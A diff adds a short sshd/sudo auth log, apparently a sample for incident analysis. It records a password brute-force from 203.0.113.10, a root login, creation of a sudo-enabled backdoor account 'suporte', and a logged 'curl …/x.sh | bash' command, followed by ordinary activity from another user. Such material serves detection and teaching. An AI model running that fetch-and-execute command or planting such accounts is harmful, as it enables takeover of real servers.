@@ -1,0 +1,16 @@
+Sep 24 03:12:01 vps sshd[1201]: Invalid user admin from 203.0.113.10 port 50122
+Sep 24 03:12:02 vps sshd[1201]: Failed password for invalid user admin from 203.0.113.10 port 50122 ssh2
+Sep 24 03:12:04 vps sshd[1203]: Failed password for invalid user test from 203.0.113.10 port 50130 ssh2
+Sep 24 03:12:06 vps sshd[1205]: Failed password for invalid user ubuntu from 203.0.113.10 port 50140 ssh2
+Sep 24 03:12:08 vps sshd[1207]: Failed password for invalid user oracle from 203.0.113.10 port 50150 ssh2
+Sep 24 03:12:10 vps sshd[1209]: Failed password for invalid user postgres from 203.0.113.10 port 50160 ssh2
+Sep 24 03:12:12 vps sshd[1211]: Failed password for root from 203.0.113.10 port 50170 ssh2
+Sep 24 03:12:14 vps sshd[1213]: Failed password for root from 203.0.113.10 port 50180 ssh2
+Sep 24 03:12:16 vps sshd[1215]: Failed password for root from 203.0.113.10 port 50190 ssh2
+Sep 24 03:12:18 vps sshd[1217]: Failed password for root from 203.0.113.10 port 50200 ssh2
+Sep 24 03:14:40 vps sshd[1230]: Accepted password for root from 203.0.113.10 port 50310 ssh2
+Sep 24 03:15:02 vps useradd[1240]: new user: name=suporte, UID=1002, GID=1002, home=/home/suporte, shell=/bin/bash
+Sep 24 03:15:05 vps usermod[1242]: add 'suporte' to group 'sudo'
+Sep 24 03:16:10 vps sudo:  suporte : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://203.0.113.10/x.sh | bash
+Sep 24 09:01:00 vps sshd[2001]: Accepted publickey for odivan from 192.0.2.200 port 60000 ssh2
+Sep 24 09:02:00 vps sudo:  odivan : TTY=pts/0 ; PWD=/home/odivan ; USER=root ; COMMAND=/usr/bin/apt update
